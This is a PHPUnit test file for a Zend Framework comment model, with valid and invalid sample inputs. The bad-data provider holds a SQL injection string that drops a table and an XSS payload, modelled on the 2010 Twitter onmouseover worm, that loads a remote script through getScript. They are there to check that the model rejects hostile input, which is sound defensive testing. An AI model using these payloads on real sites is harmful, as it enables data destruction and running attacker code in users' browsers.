<?php
class Application_Model_CommentTest extends PHPUnit_Framework_TestCase
{
    protected $_comment;
    
    protected function setUp()
    {
        $this->_comment = new Application_Model_Comment();
        parent::setUp();
    }
    protected function tearDown()
    {
        parent::tearDown();
        $this->_comment = null;
    }
    public function testModelIsEmptyAtConstruct()
    {
        $this->assertSame(0, $this->_comment->getId());
        $this->assertNull($this->_comment->getFullName());
        $this->assertNull($this->_comment->getEmailAddress());
        $this->assertNull($this->_comment->getWebsite());
        $this->assertNull($this->_comment->getComment());
    }
    public function goodData()
    {
        return array (
            array ('John Doe', 'john.doe@example.com', 
                   'http://example.com', 'test comment'),
            array ("Matthew Weier O'Phinney", 'matthew@zend.com', 
                   'http://weierophinney.net', 'Doing an MWOP-Test'),
            array ('D. Keith Casey, Jr.', 'Keith@CaseySoftware.com', 
                   'http://caseysoftware.com', 'Doing a monkey dance'),
        );
    }
    /**
     * @dataProvider goodData
     */
    public function testModelAcceptsValidData($name, $mail, $web, $comment)
    {
        $data = array (
            'fullName' => $name, 'emailAddress' => $mail, 'website' => $web, 'comment' => $comment,
        );
        try {
            $this->_comment->populate($data);
        } catch (Zend_Exception $e) {
            $this->fail('Unexpected exception should not be triggered');
        }
        $data['id'] = 0;
        $data['emailAddress'] = strtolower($data['emailAddress']);
        $data['website'] = strtolower($data['website']);
        $this->assertEquals($data, $this->_comment->toArray());
    }
    public function badData()
    {
        return array (
            array ('','','',''),
            array ("Robert'; DROP TABLES comments; --", '', 'http://xkcd.com/327/','Little Bobby Tables'),
            array (str_repeat('x', 1000), '', '', ''),
            array ('John Doe', 'jd@example.com', "http://t.co/@\"style=\"font-size:999999999999px;\"onmouseover=\"$.getScript('http:\u002f\u002fis.gd\u002ffl9A7')\"/", 'exploit twitter 9/21/2010'),
        );
    }
	/**
     * @dataProvider badData
     */
    public function testFormRejectsBadData($name, $mail, $web, $comment)
    {
        $data = array (
            'fullName' => $name, 'emailAddress' => $mail, 'website' => $web, 'comment' => $comment,
        );
        try {
            $this->_comment->populate($data);
        } catch (Zend_Exception $e) {
            return;
        }
        $this->fail('Expected exception should be triggered');
        
    }
}